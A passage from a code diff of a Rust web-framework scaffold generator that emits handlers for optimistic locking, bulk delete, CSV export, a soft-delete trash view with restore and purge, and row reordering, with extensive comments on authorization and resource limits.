+    // validation failure hands the same version back and the author's next
+    // submit still races against the row they actually opened.
+    let update_lock_version_preamble = lock_version.map_or_else(String::new, |_| {
+        "let expected_lock_version = parse_lock_version(&body)?;\n    \
+         let lock_version_value = expected_lock_version;\n    \
+         let lock_conflict = false;\n    "
+            .to_owned()
+    });
+    let update_doc_locking = if lock_version.is_some() {
+        "/// Optimistic locking (issue #1318): the `UPDATE` is guarded by the\n\
+         /// `lock_version` the edit form was rendered against, so a submit that\n\
+         /// lost a race to a concurrent editor matches zero rows and re-renders\n\
+         /// the form at 409 instead of silently overwriting their work.\n"
+    } else {
+        ""
+    };
     let update_fn = format!(
-        "/// `POST /{plural}/{{id}}/update` — validate and apply form data to a row,\n\
+        "/// `POST /{plural}/{{{id_url_segment}}}/update` — validate and apply form data to a row,\n\
          /// or re-render the edit form at 422 with inline errors and preserved input.\n\
          /// Uses column-by-column `diesel::update().set(...)` (same convention as\n\
          /// `examples/todo-app`) so we don't need `AsChangeset` on `New{pascal_name}`.\n\
+         {update_doc_locking}\
          #[secured]\n\
-         #[post(\"/{plural}/{{id}}/update\")]\n\
+         #[post(\"/{plural}/{{{id_url_segment}}}/update\")]\n\
          pub async fn update(\n    \
          {update_signature}\n\
          ) -> AutumnResult<autumn_web::reexports::axum::response::Response> {{\n    \
          use autumn_web::reexports::axum::response::IntoResponse as _;\n    \
          {authz_update_preamble}\
+         {update_lock_version_preamble}\
          {form_decode_block}\n    \
+         {update_load_and_authorize_block}\
          let changeset = form.into_changeset();\n    \
          if !changeset.is_valid() {{\n        \
          {blob_cleanup}return Ok((autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY, {edit_form_body}).into_response());\n    \
@@ -2792,6 +5758,170 @@ fn render_routes_file(
          {update_apply_block}\n\
          }}\n"
     );
+
+    // ── issue #1312: bulk-select + delete-selected ─────────────────────────
+    //
+    // The repeated-checkbox body parser. Emitted next to `csrf_input` /
+    // `submit_token_input` (the routes module's other private form helpers) and
+    // only when the bulk gate is on, so the `--live`/`--sharded` output is
+    // byte-identical.
+    let bulk_ids_parser = if bulk_delete_enabled {
+        "\n/// Most rows one bulk submit may touch.\n\
+         ///\n\
+         /// The checkboxes come from a single rendered page, so a real selection is\n\
+         /// page-sized; this cap only bites on a hand-crafted body. Without it the\n\
+         /// selection is bounded solely by the request-size limit (32 MiB by\n\
+         /// default), which is room for over a million ids — enough that even the\n\
+         /// chunked pre-flight below would issue a long run of sequential `SELECT`s,\n\
+         /// holding a pooled connection the whole time, for a batch that may match\n\
+         /// no rows at all.\n\
+         const MAX_BULK_IDS: usize = 5000;\n\
+         \n\
+         /// Parse the bulk-select checkboxes out of a URL-encoded form body.\n\
+         ///\n\
+         /// Accepts both the plain `ids=1&ids=2` spelling the generated checkboxes\n\
+         /// submit and the `ids[]=1&ids[]=2` spelling some clients send. A value\n\
+         /// that isn't an integer is dropped rather than rejected — a list-write\n\
+         /// endpoint never 400s on a hand-edited form — and repeats are collapsed\n\
+         /// so the same row is never queued for deletion twice.\n\
+         ///\n\
+         /// Dedup goes through a `HashSet` rather than a linear `Vec::contains`\n\
+         /// scan: this parses the raw body, not a page-sized selection, so a\n\
+         /// hand-crafted POST can carry as many distinct `ids` as the request body\n\
+         /// limit allows. A linear scan per value would make that Θ(n²) — a cheap\n\
+         /// request burning real CPU before the handler ever reaches the database.\n\
+         /// The `Vec` still carries insertion order; the set only answers \"seen?\".\n\
+         fn parse_bulk_ids(body: &Bytes) -> Vec<i64> {\n    \
+         let mut ids: Vec<i64> = Vec::new();\n    \
+         let mut seen: std::collections::HashSet<i64> = std::collections::HashSet::new();\n    \
+         for (key, value) in url::form_urlencoded::parse(body.as_ref()) {\n        \
+         if key == \"ids\" || key == \"ids[]\" {\n            \
+         if let Ok(id) = value.parse::<i64>() {\n                \
+         if seen.insert(id) {\n                    \
+         ids.push(id);\n                    \
+         // Stop one past the cap. The handler refuses anything longer, so\n                    \
+         // parsing the rest would burn CPU on a body already destined for\n                    \
+         // rejection — and collecting it would let the request size alone\n                    \
+         // decide how much memory this allocates.\n                    \
+         if ids.len() > MAX_BULK_IDS {\n                        \
+         break;\n                    \
+         }\n                \
+         }\n            \
+         }\n        \
+         }\n    \
+         }\n    \
+         ids\n\
+         }\n"
+    } else {
+        ""
+    };
+    // `POST /{plural}/bulk_delete`. Emitted straight after the `index` handler
+    // it serves (and before `show`), so the list view and its bulk action read
+    // together.
+    let bulk_delete_fn = if bulk_delete_enabled {
+        // Same `State` + `Session` pair `destroy` takes when policy wiring is on.
+        let authz_params = if authorize {
+            format!("{edit_destroy_authz_params},")
+        } else {
+            String::new()
+        };
+        // Soft-delete: an already-deleted row is invisible to the list, so it must
+        // stay out of the selection too (matching `destroy`'s `deleted_at IS NULL`
+        // filter). The actual delete still routes through `delete_many`, which
+        // applies the repository's soft-delete + `dependent(...)` cascade rules.
+        // Trailing indent lines the chained call up inside the chunk loop below.
+        let soft_delete_filter = if soft_delete {
+            format!(".filter({plural}::deleted_at.is_null())\n            ")
+        } else {
+            String::new()
+        };
+        let allowed_block = if authorize {
+            format!(
+                "    let mut allowed: Vec<i64> = Vec::with_capacity(rows.len());\n    \
+                 for row in &rows {{\n        \
+                 // A row the actor may not delete is dropped from the batch instead of\n        \
+                 // failing the request: answering differently for \"not yours\" than for\n        \
+                 // \"not selected\" would turn this endpoint into an existence oracle.\n        \
+                 if autumn_web::authorization::authorize::<{pascal_name}>({edit_destroy_state_expr}, &session, \"delete\", row)\n            \
+                 .await\n            \
+                 .is_ok()\n        \
+                 {{\n            \
+                 allowed.push(row.id);\n        \
+                 }}\n    \
+                 }}\n"
+            )
+        } else {
+            "    let allowed: Vec<i64> = rows.iter().map(|row| row.id).collect();\n".to_owned()
+        };
+        format!(
+            "\n\n/// `POST /{plural}/bulk_delete` — delete every selected row in one submit.\n\
+             ///\n\
+             /// Reads the index list's repeated `ids` checkboxes (see `parse_bulk_ids`,\n\
+             /// which also accepts the `ids[]` spelling). Malformed ids are dropped and an\n\
+             /// empty selection just redirects back with an informational flash — a\n\
+             /// list-write endpoint never 400s on bad params. The delete itself routes\n\
+             /// through the repository's `delete_many`, so soft-delete, model hooks, and\n\
+             /// `dependent(...)` cascades all apply exactly as they do for the single-row\n\
+             /// `destroy`; a `dependent(restrict)` violation aborts the whole batch with a\n\
+             /// 409 and rolls back.\n\
+             #[secured]\n\
+             #[post(\"/{plural}/bulk_delete\")]\n\
+             pub async fn bulk_delete(\n    \
+             {locale_param}flash: Flash,{authz_params}\n    \
+             repo: Pg{pascal_name}Repository,\n    \
+             mut db: {db_ty},\n    \
+             body: Bytes,\n\
+             ) -> AutumnResult<autumn_web::Redirect> {{\n    \
+             let ids = parse_bulk_ids(&body);\n    \
+             if ids.is_empty() {{\n        \
+             flash.info({flash_none_selected}).await;\n        \
+             return Ok(autumn_web::Redirect::to(&paths::index()));\n    \
+             }}\n    \
+             // Refuse an oversized selection outright rather than truncating it: a\n    \
+             // silently partial destructive batch is worse than a refused one. Like\n    \
+             // the empty case this redirects with a flash instead of 400ing.\n    \
+             if ids.len() > MAX_BULK_IDS {{\n        \
+             flash\n            \
+             .error({flash_bulk_cap})\n            \
+             .await;\n        \
+             return Ok(autumn_web::Redirect::to(&paths::index()));\n    \
+             }}\n    \
+             // Chunk the pre-flight the way the repository chunks its own id\n    \
+             // queries. `eq_any` binds one parameter per id, and this reads a raw\n    \
+             // body rather than a page-sized selection, so a crafted POST can carry\n    \
+             // far more ids than a backend's placeholder ceiling\n    \
+             // (`autumn_web::repository::MAX_BIND_PARAMS` — 32766 on SQLite). A\n    \
+             // single `eq_any` would then fail the request outright with \"too many\n    \
+             // SQL variables\", never reaching the already-chunked `delete_many`.\n    \
+             // Grown from what the database actually returns, never sized from\n    \
+             // `ids.len()`: that count comes straight off the request body, so\n    \
+             // pre-allocating from it would let a body full of ids that match no\n    \
+             // row reserve memory for rows that do not exist.\n    \
+             let mut rows: Vec<{pascal_name}> = Vec::new();\n    \
+             for chunk in ids.chunks(1000) {{\n        \
+             let mut batch: Vec<{pascal_name}> = {plural}::table\n            \
+             .filter({plural}::id.eq_any(chunk))\n            \
+             {soft_delete_filter}.select({pascal_name}::as_select())\n            \
+             .load(&mut *db)\n            \
+             .await?;\n        \
+             rows.append(&mut batch);\n    \
+             }}\n    \
+             // Release the `Db` extractor's connection before `delete_many` checks out\n    \
+             // its own. `Db` acquires eagerly at extraction and holds until dropped —\n    \
+             // not just for the `&mut *db` borrow above — so keeping it alive here would\n    \
+             // make this handler hold two connections at once: an unconditional stall on\n    \
+             // a pool of one, and a deadlock once enough requests are in the handler\n    \
+             // together on any pool size.\n    \
+             drop(db);\n\
+             {allowed_block}    \
+             repo.delete_many(&allowed).await?;\n    \
+             flash.success({flash_bulk_deleted}).await;\n    \
+             Ok(autumn_web::Redirect::to(&paths::index()))\n\
+             }}"
+        )
+    } else {
+        String::new()
+    };
 
     // Template splice bindings for the generated form struct, its conversion,
     // the edit-form seed, and (when present) the datetime parse helper.
@@ -2842,6 +5972,522 @@ fn render_routes_file(
         String::new()
     };
 
+    // Issue #1315: the `CsvSchema` impl + `GET /{plural}/export.csv` download.
+    // Emitted straight after the index (and `bulk_delete`) it exports, so an
+    // author reading the module top-to-bottom meets the schema, then the route
+    // that streams it, right where the list lives.
+    //
+    // The impl lives here rather than in `src/models/{snake}.rs` on purpose: the
+    // orphan rule is satisfied either way (the model type is crate-local), and
+    // keeping it beside its only consumer means the whole feature — impl, route,
+    // link, Cargo feature — is gated in one place. Move it to the model module
+    // if a second consumer (an `import_csv` route, an `autumn data export` task)
+    // appears.
+    let export_csv_fn = if export_enabled {
+        let schema_impl = render_csv_schema_impl(pascal_name, all_fields);
+        // AC5: mirror the index's posture exactly. The owner-scoped index is
+        // `#[secured]` and resolves its owner from the same `PolicyContext` the
+        // mutating handlers authorize against; the plain index carries neither.
+        let (secured_attr, authz_params, owner_let, list_call) = if owner_scoped_standard {
+            (
+                "#[secured]\n",
+                format!("{authz_params_full},"),
+                "    let ctx = autumn_web::authorization::PolicyContext::from_request(&state, &session).await;\n    \
+                 let owner_id = ctx.user_id_i64().unwrap_or(-1);\n",
+                "repo.list_scoped(owner_id, &list_query, &page_req)",
+            )
+        } else {
+            ("", String::new(), "", "repo.list(&list_query, &page_req)")
+        };
+        // Issue #1319's search box swaps results in via htmx WITHOUT pushing a
+        // URL, so the index's query string — and therefore this export's — never
+        // carries the search term, and `ListQuery` has no field for one. Say so
+        // in the emitted docs rather than let the "matches the filtered view"
+        // sentence above quietly overpromise on a searchable scaffold.
+        // Built with `format!`, not spliced as a literal: this fragment names the
+        // resource's own search route, and the OUTER `format!` does not expand
+        // placeholders inside an already-substituted value — a `{plural}` left in
+        // a plain `&str` here would reach the user's source verbatim.
+        let search_note = if search_enabled {
+            format!(
+                "///\n\
+                 /// NOT included: the `/{plural}/search` term. `ListQuery` carries sort\n\
+                 /// and column filters, not a full-text query, and the search box swaps\n\
+                 /// its results in without changing the URL — so a search on screen does\n\
+                 /// not narrow this download.\n\
+                 ///\n\
+                 /// The index therefore renders its \"Export CSV\" link INSIDE the\n\
+                 /// `#{plural}-search-results` container, not beside \"New …\": the swap\n\
+                 /// that shows search results removes the link along with the rows it\n\
+                 /// described. Left outside, it would survive the swap still pointing\n\
+                 /// here, and a user who had narrowed the list would download the rows\n\
+                 /// they just excluded. If you move that link back out to page\n\
+                 /// furniture, wire `q` through to this handler in the same change.\n\
+                 ///\n\
+                 /// To offer an export of searched rows, take `q` here and call the\n\
+                 /// repository's `search_page`, then render a link carrying the term\n\
+                 /// from the search fragment as well as the index.\n"
+            )
+        } else {
+            String::new()
+        };
+        let scope_note = if owner_scoped_standard {
+            "///\n\
+             /// Rows are read through the repository's OWNER-SCOPED `list_scoped`, the\n\
+             /// same method the index uses. This handler never calls the unscoped\n\
+             /// `list`/`page`, so the download can never contain another user's rows.\n"
+        } else {
+            ""
+        };
+        format!(
+            "{schema_impl}\n\
+             /// The most rows one `GET /{plural}/export.csv` will return.\n\
+             ///\n\
+             /// The handler reads up to one batch PAST this so it can tell a full\n\
+             /// export from a truncated one; the surplus is trimmed before the CSV is\n\
+             /// written.\n\
+             ///\n\
+             /// This bounds the ROW COUNT, which bounds memory only as far as your\n\
+             /// widest row: the response is collected in memory before it is sent, so\n\
+             /// a model with an unbounded `Text` column can still build a large body\n\
+             /// here. Put a `{{max}}` length on such columns, lower this constant, or —\n\
+             /// for a genuinely unbounded export — stream the batches straight into\n\
+             /// the response body with `Download::from_stream` instead of collecting\n\
+             /// them first.\n\
+             const MAX_EXPORT_ROWS: usize = 10_000;\n\n\
+             /// `GET /{plural}/export.csv` — the list view as an RFC 4180 CSV download.\n\
+             ///\n\
+             /// Honours the SAME allowlisted `?sort=`/`?filter[col]=` params as `index`\n\
+             /// (the shared [`ListQuery`] extractor), so the file matches the filtered\n\
+             /// view the \"Export CSV\" link was clicked from rather than the whole\n\
+             /// table. `?page=`/`?size=` are ignored on purpose: an export spans every\n\
+             /// page of the current filter.\n\
+             ///\n\
+             /// Rows are read in `MAX_PAGE_SIZE` batches (so no single query loads the\n\
+             /// table) and capped at `MAX_EXPORT_ROWS`, plus one batch past the cap to\n\
+             /// detect truncation. `Content-Type`,\n\
+             /// `Content-Disposition` and `Content-Length` come from `Download`, which\n\
+             /// infers `text/csv` from the `.csv` filename and sanitizes the name.\n\
+             ///\n\
+             /// CONSISTENCY is per batch, not per export. Each batch is an independent\n\
+             /// `LIMIT`/`OFFSET` query on its own pooled connection, so a row inserted\n\
+             /// or deleted mid-export shifts the offsets under the batches still to\n\
+             /// come: a row can land in the file twice, or not at all. The index has\n\
+             /// the same property — an export just spans more pages, and more\n\
+             /// wall-clock, so it is likelier to notice. For a point-in-time exact\n\
+             /// download, read the batches by hand inside\n\
+             /// `Db::tx_with(TxOptions::repeatable_read().read_only(), ..)`; the\n\
+             /// repository's pooled reads cannot be routed through a caller's\n\
+             /// transaction today, so that path means writing the query yourself —\n\
+             /// including this one's sort/filter allowlist and any owner scoping.\n\
+             ///\n\
+             /// COST, not row-set, is why this carries a `#[throttle]` the index does\n\
+             /// not, and the cost is worse than the row count suggests. `list` runs a\n\
+             /// filtered `COUNT(*)` before each page, so a full export is ~100 page\n\
+             /// queries AND ~100 whole-result-set counts — ~200 round trips where one\n\
+             /// index page costs two. The counts are pure waste here: this loop never\n\
+             /// reads `total_elements`, it stops on a short batch. They are paid\n\
+             /// anyway because `list` is also what applies the sort/filter allowlist,\n\
+             /// and the repository exposes no count-free equivalent. On a large or\n\
+             /// poorly indexed table budget accordingly: lower `MAX_EXPORT_ROWS`,\n\
+             /// tighten this throttle, or put the route behind auth.\n\
+             ///\n\
+             /// The limit applies per client address and is independent of\n\
+             /// `security.rate_limit.enabled` (that flag governs the GLOBAL limiter);\n\
+             /// raise it freely for an internal back-office.\n\
+             ///\n\
+             /// AUTHORIZATION is the index's, not `show`'s: like the index, this lists\n\
+             /// rows without calling `authorize(.., \"show\", &row)` per record. If you\n\
+             /// tighten `can_show` in the generated policy so some rows are hidden on\n\
+             /// their detail page, filter them out of BOTH the index query and this\n\
+             /// one — a per-row rule the list path does not apply is not enforced.\n\
+             {search_note}{scope_note}{secured_attr}\
+             #[get(\"/{plural}/export.csv\")]\n\
+             #[autumn_web::throttle(limit = 6, per = \"1m\", key = \"ip\")]\n\
+             pub async fn export_csv(\n    \
+             list_query: ListQuery,{authz_params}\n    \
+             repo: Pg{pascal_name}Repository,\n\
+             ) -> AutumnResult<autumn_web::reexports::axum::response::Response> {{\n    \
+             use autumn_web::reexports::axum::response::IntoResponse as _;\n\
+             {default_sort_let}{owner_let}    \
+             let batch_size = autumn_web::pagination::MAX_PAGE_SIZE;\n    \
+             let mut rows: Vec<{pascal_name}> = Vec::new();\n    \
+             let mut page: u32 = 1;\n    \
+             loop {{\n        \
+             let page_req = PageRequest::new(page, batch_size);\n        \
+             let batch: Page<{pascal_name}> = {list_call}.await?;\n        \
+             // A short batch is the last one: nothing after it to ask for.\n        \
+             let exhausted = batch.content.len() < batch_size as usize;\n        \
+             rows.extend(batch.content);\n        \
+             // `>`, not `>=`: stopping the moment the cap is FILLED cannot tell a\n        \
+             // result set of exactly MAX_EXPORT_ROWS from a larger one, so the\n        \
+             // truncation warning below would never fire and over-cap exports would\n        \
+             // drop rows silently. Read past the cap and trim the surplus off.\n        \
+             if exhausted || rows.len() > MAX_EXPORT_ROWS {{\n            \
+             break;\n        \
+             }}\n        \
+             page += 1;\n    \
+             }}\n    \
+             // Truncate rather than fail: a partial spreadsheet beats a 500. But a\n    \
+             // SILENTLY partial one is a trap for anyone exporting to reconcile, so\n    \
+             // say so twice — once in the log for the operator, once in a response\n    \
+             // header the client can see. Narrow the filter, or raise\n    \
+             // `MAX_EXPORT_ROWS`. (A marker row inside the CSV is not an option: it\n    \
+             // would parse as data.)\n    \
+             let truncated = rows.len() > MAX_EXPORT_ROWS;\n    \
+             if truncated {{\n        \
+             autumn_web::reexports::tracing::warn!(\n            \
+             cap = MAX_EXPORT_ROWS,\n            \
+             rows = rows.len(),\n            \
+             \"{plural} CSV export hit MAX_EXPORT_ROWS; the download is truncated\"\n        \
+             );\n        \
+             rows.truncate(MAX_EXPORT_ROWS);\n    \
+             }}\n    \
+             let mut body: Vec<u8> = Vec::new();\n    \
+             autumn_web::data::csv::export_csv(rows, &mut body)?;\n    \
+             let mut response = autumn_web::download::Download::from_bytes(body)\n        \
+             .filename(\"{plural}.csv\")\n        \
+             .into_response();\n    \
+             if truncated {{\n        \
+             response.headers_mut().insert(\n            \
+             \"x-export-truncated\",\n            \
+             autumn_web::reexports::http::HeaderValue::from_static(\"true\"),\n        \
+             );\n    \
+             }}\n    \
+             Ok(response)\n\
+             }}\n"
+        )
+    } else {
+        String::new()
+    };
+
+    // Issue #1332: the trash view + its Restore/Purge handlers. Emitted straight
+    // after the index (and its bulk/export companions) because the Trash link is
+    // index furniture and the page it opens is the same list, filtered to the
+    // rows `destroy` marked deleted.
+    let trash_section = if trash_enabled {
+        // The trash table's own columns. Deliberately NOT the index's:
+        //
+        //   * `use_label_maps = false` — a reference column renders the raw
+        //     foreign key rather than the parent's label, so this handler needs
+        //     no `Db` extractor purely to run label loads for a recycle bin;
+        //   * `sortable = false` — this handler extracts no `ListQuery` (the
+        //     `only_deleted` scope orders `id DESC` and takes no sort), and a
+        //     sortable header would render a link that reloads the identical
+        //     list while stamping an `aria-sort` that never changes.
+        //
+        // Rebound as `mut` so the two trash-only columns can be pushed after it.
+        let trash_columns = render_columns_vec(
+            pascal_name,
+            snake_name,
+            fields,
+            &reference_displays,
+            false,
+            route_key_field,
+            false,
+            labels,
+        )
+        .replacen("    let columns:", "    let mut columns:", 1);
+        // Restore and Purge act on the row the trash page just listed, so they
+        // record-authorize it exactly as `destroy` does — same `"delete"` action,
+        // same extractor pair. Moving a row into or out of the trash is the same
+        // authority as deleting it, and `Policy::can` fails closed on any action
+        // name it does not know, so inventing a "restore" action here would deny
+        // every request against a hand-written policy.
+        let trash_authz_params = if authorize {
+            format!("{edit_destroy_authz_params},")
+        } else {
+            String::new()
+        };
+        let trash_authz_call = if authorize {
+            format!(
+                "    autumn_web::authorization::authorize::<{pascal_name}>({edit_destroy_state_expr}, &session, \"delete\", &row).await?;\n"
+            )
+        } else {
+            String::new()
+        };
+        // The guard load both handlers share. It is the ONE place either handler
+        // touches `deleted_at` directly, and it is not a substitute for the
+        // `only_deleted` scope the LIST reads through — it is a precondition:
+        //
+        //   * `purge` is the only hard delete in the generated app, and the
+        //     repository's `purge(id)` deletes whatever row carries that id,
+        //     trashed or not. Without this filter a crafted POST would hard-
+        //     delete a LIVE row, straight past the soft-delete tunnel the whole
+        //     feature exists to provide;
+        //   * a row that is not in the trash cannot be restored from it, so both
+        //     handlers answer 404 rather than reporting success for a no-op;
+        //   * the loaded row is what the record policy authorizes against.
+        let trash_guard_load = format!(
+            "    let row: {pascal_name} = {plural}::table\n        \
+             .{find_expr}\n        \
+             .filter({plural}::deleted_at.is_not_null())\n        \
+             .select({pascal_name}::as_select())\n        \
+             .first(&mut *db)\n        \
+             .await\n        \
+             .map_err(AutumnError::not_found)?;\n"
+        );
+        // Release the `Db` extractor's connection before the repository checks
+        // out its own. `Db` acquires eagerly at extraction and holds until
+        // dropped, so keeping it alive across the repository call would make
+        // these handlers hold two connections at once — an unconditional stall
+        // on a pool of one (same reasoning as `bulk_delete`).
+        let cp_trash = cp(&format!("/{plural}/trash"));
+        // The soft-delete column's table header, title-cased the same way every
+        // other index column header is (`title_case`), so the trash table reads
+        // like the list it mirrors.
+        let deleted_at_header = title_case("deleted_at");
+        // Issue #1349: the trash view's own strings.
+        //
+        // The two extra `Column`s take `let` bindings, exactly like the
+        // `l_col_*` headers `render_columns_vec` emits: `Column<'a, T>` holds
+        // its header as `&'a str` and both are pushed into a `columns` vec that
+        // outlives the statement, so an inline `&t!(…)` would be a temporary
+        // dropped at the end of the `insert`/`push` (E0716). `confirm_action`'s
+        // per-row title and its config, by contrast, are consumed inside a
+        // single statement and can stay inline. The bindings are spliced BEFORE
+        // the `columns` vec, not after: locals drop in reverse declaration
+        // order, so a label declared after the vec it is borrowed into would be
+        // dropped first (E0597).
+        let (deleted_at_header_expr, actions_header_expr, trash_label_binds) = if labels.enabled() {
+            (
+                "&l_trash_deleted_at".to_owned(),
+                "&l_trash_actions".to_owned(),
+                format!(
+                    "    let l_trash_deleted_at = {};\n    let l_trash_actions = {};\n",
+                    labels.lit("common.field.deleted_at", &deleted_at_header),
+                    labels.lit("common.actions", "Actions"),
+                ),
+            )
+        } else {
+            (
+                format!("\"{deleted_at_header}\""),
+                "\"Actions\"".to_owned(),
+                String::new(),
+            )
+        };
+        let purge_title_expr = labels.expr(
+            &format!("{snake_name}.purge.confirm"),
+            &format!("Permanently delete {snake_name} {{ $id }}?"),
+            &format!(
+                "format!(\"Permanently delete {snake_name} {{}}?\", {route_key_display_expr})"
+            ),
+            &[("id", &format!("&({route_key_display_expr}).to_string()"))],
+        );
+        let purge_warning = labels.markup(
+            "common.purge.warning",
+            "This action cannot be undone. Restore it instead if you might need it later.",
+        );
+        let (purge_cancel_bind, purge_cancel) = if labels.enabled() {
+            (
+                format!(
+                    "let purge_cancel = {};\n        ",
+                    labels.lit("common.cancel", "Cancel")
+                ),
+                "\n            .cancel_label(&purge_cancel)".to_owned(),
+            )
+        } else {
+            (String::new(), String::new())
+        };
+        let restore_button = labels.lit("common.restore", "Restore");
+        let purge_button = labels.lit_ref("common.purge", "Purge");
+        let trash_title = labels.lit_ref(
+            &format!("{snake_name}.trash.title"),
+            &format!("{pascal_name} trash"),
+        );
+        let trash_heading = labels.markup(
+            &format!("{snake_name}.trash.heading"),
+            &format!("Deleted {pascal_name}s"),
+        );
+        let trash_empty = labels.lit_ref("common.trash.empty", "Trash is empty.");
+        format!(
+            r#"
+
+/// `GET /{plural}/trash` — the Trash view for soft-deleted {snake_name}s (issue #1332).
+///
+/// Lists the rows the delete button marked deleted, read through the
+/// repository's generated `page_only_deleted` — the paginated form of the
+/// `only_deleted` scope `#[repository(..., soft_delete)]` emits — so "deleted"
+/// is defined in exactly one place and this page can never drift from what the
+/// index hides. Each row offers Restore (undo) and Purge (the only hard delete
+/// in this application).
+#[secured]
+#[get("/{plural}/trash")]
+pub async fn trash(
+    {locale_param}page_req: PageRequest,
+    repo: Pg{pascal_name}Repository,
+    flash: Flash,
+    csrf: Option<CsrfToken>,
+    csrf_field: Option<CsrfFormField>,
+) -> AutumnResult<Markup> {{
+    let page_data: Page<{pascal_name}> = repo.page_only_deleted(&page_req).await?;
+    // Purge is irreversible, so it goes through the framework's server-rendered
+    // confirm dialog rather than an inline `window.confirm` handler: the default
+    // CSP is `script-src 'self'` with no `'unsafe-inline'`, which blocks an
+    // inline event attribute outright — the form would submit with no prompt at
+    // all, which is worse than promising one. `confirm_action` renders a
+    // `<dialog>` driven by the `autumn-widgets.js` the generated layout already
+    // loads, plus a `<noscript>` fallback so the action stays reachable without
+    // JavaScript.
+    let purge_csrf = csrf.as_ref().map(|token| token.token()).unwrap_or_default();
+{trash_label_binds}{trash_columns}    // The `{deleted_at_header}` stamp goes BEFORE the trailing "Show" link column that
+    // `columns` ends with, so the data columns stay together and the two link
+    // columns stay at the end of the row.
+    columns.insert(
+        columns.len() - 1,
+        autumn_web::widgets::Column::new({deleted_at_header_expr}, |row: &{pascal_name}| maud::html! {{ (row.deleted_at.as_ref().map(ToString::to_string).unwrap_or_default()) }}),
+    );
+    columns.push(autumn_web::widgets::Column::new({actions_header_expr}, |row: &{pascal_name}| {{
+        // Titled per row rather than once for the whole page: a page-sized
+        // trash renders one dialog per row, and identical titles would put a
+        // run of indistinguishable `<h2>`s in the heading outline — and leave
+        // the person confirming an irreversible delete with nothing on screen
+        // saying WHICH {snake_name} they are about to destroy.
+        let purge_title = {purge_title_expr};
+        {purge_cancel_bind}let purge_confirm = autumn_web::widgets::ConfirmActionConfig::new()
+            .title(&purge_title){purge_cancel}
+            .message(maud::html! {{ p {{ {purge_warning} }} }});
+        let purge_confirm = match csrf_field.as_ref() {{
+            Some(field) => purge_confirm.csrf_field(field.0.as_str()),
+            None => purge_confirm,
+        }};
+        maud::html! {{
+            form action=(paths::restore({route_key_display_expr})) method="post" {{
+                (csrf_input(csrf.as_ref(), csrf_field.as_ref()))
+                (autumn_web::a11y::Button::new({restore_button}).submit())
+            }}
+            (autumn_web::widgets::confirm_action(
+                &format!("purge-{{}}", row.id),
+                {purge_button},
+                &paths::purge({route_key_display_expr}),
+                autumn_web::reexports::http::Method::POST,
+                purge_csrf,
+                &purge_confirm,
+            ))
+        }}
+    }}));
+    Ok({layout_fn}({trash_title}, {cp_trash}{flash_arg}, html! {{
+        h1 {{ {trash_heading} }}
+        (autumn_web::a11y::Link::new(paths::index(), {back_to_list}))
+        (autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new({trash_empty}).base_path(&paths::trash())))
+        (pagination_nav(&page_data, &PagerOptions::new(&paths::trash()){pager_labels}))
+    }}))
+}}
+
+/// `POST /{plural}/{{{id_url_segment}}}/restore` — put a trashed {snake_name} back.
+///
+/// Clears `deleted_at` through the repository's generated `restore`, so the row
+/// reappears in the index (which filters `deleted_at IS NULL`) and drops out of
+/// the trash. 404s for a {snake_name} that is not in the trash.
+#[secured]
+#[post("/{plural}/{{{id_url_segment}}}/restore")]
+pub async fn restore(
+    {locale_param}{id_param_decl},
+    mut db: {db_ty},
+    repo: Pg{pascal_name}Repository,
+    flash: Flash,{trash_authz_params}
+) -> AutumnResult<autumn_web::Redirect> {{
+{trash_guard_load}{trash_authz_call}    drop(db);
+    repo.restore(row.id).await?;
+    // The redirect lands back on the Trash page (the row is gone from it), so
+    // the flash has to say where the {snake_name} actually went.
+    flash.success({flash_restored}).await;
+    Ok(autumn_web::Redirect::to(&paths::trash()))
+}}
+
+/// `POST /{plural}/{{{id_url_segment}}}/purge` — permanently delete a trashed {snake_name}.
+///
+/// The ONLY hard delete in this application: every other path marks
+/// `deleted_at`. Routed through the repository's generated `purge`, and reached
+/// only for a row that was in the trash when this request loaded it — so a
+/// {snake_name} cannot be destroyed here without having been soft-deleted first.
+///
+/// SECURITY: this is irreversible and is authorized by exactly the same
+/// `"delete"` policy check as the recoverable `destroy`. If permanent deletion
+/// should be a higher bar in your app — admins only, or a re-authentication
+/// step — tighten it in `{pascal_name}Policy` or add `#[reauthenticate]` here;
+/// the generated policy authorizes any authenticated user by default.
+///
+/// The trash-membership check and the delete run on separate connections (the
+/// repository takes its own), so a `restore` that commits in between means this
+/// hard-deletes a row that just became live again. Nobody can reach the delete
+/// without the row having been trashed, but if losing that race is unacceptable,
+/// replace the `purge` call with a filtered `diesel::delete(… .filter(
+/// {plural}::deleted_at.is_not_null()))` on this handler's own connection.
+#[secured]
+#[post("/{plural}/{{{id_url_segment}}}/purge")]
+pub async fn purge(
+    {locale_param}{id_param_decl},
+    mut db: {db_ty},
+    repo: Pg{pascal_name}Repository,
+    flash: Flash,{trash_authz_params}
+) -> AutumnResult<autumn_web::Redirect> {{
+{trash_guard_load}{trash_authz_call}    drop(db);
+    repo.purge(row.id).await?;
+    flash.success({flash_purged}).await;
+    Ok(autumn_web::Redirect::to(&paths::trash()))
+}}
+"#
+        )
+    } else {
+        String::new()
+    };
+
+    // Issue #1358: the position field's `move_up`/`move_down` no-JS button
+    // targets. Authorized identically to `edit_form`/`update` ("edit" action,
+    // record policy) since moving a row is a content mutation, not a
+    // deletion — reuses `edit_destroy_authz_params`/`authz_edit_call` rather
+    // than inventing a third authorization shape.
+    let reorder_section = if reorder_enabled {
+        format!(
+            r#"
+/// `POST /{plural}/{{{id_url_segment}}}/move_up` — move a {snake_name} one position toward the start of its list.
+#[secured]
+#[post("/{plural}/{{{id_url_segment}}}/move_up")]
+pub async fn move_up(
+    {locale_param}{id_param_decl},
+    mut db: {db_ty},
+    repo: Pg{pascal_name}Repository,
+    flash: Flash,{edit_destroy_authz_params}
+) -> AutumnResult<autumn_web::Redirect> {{
+    let row: {pascal_name} = {plural}::table
+        .{find_expr}
+        .select({pascal_name}::as_select())
+        .first(&mut *db)
+        .await
+        .map_err(AutumnError::not_found)?;
+    {authz_edit_call}drop(db);
+    repo.move_up(row.id).await?;
+    flash.success({flash_moved}).await;
+    Ok(autumn_web::Redirect::to(&paths::index()))
+}}
+
+/// `POST /{plural}/{{{id_url_segment}}}/move_down` — move a {snake_name} one position toward the end of its list.
+#[secured]
+#[post("/{plural}/{{{id_url_segment}}}/move_down")]
+pub async fn move_down(
+    {locale_param}{id_param_decl},
+    mut db: {db_ty},
+    repo: Pg{pascal_name}Repository,
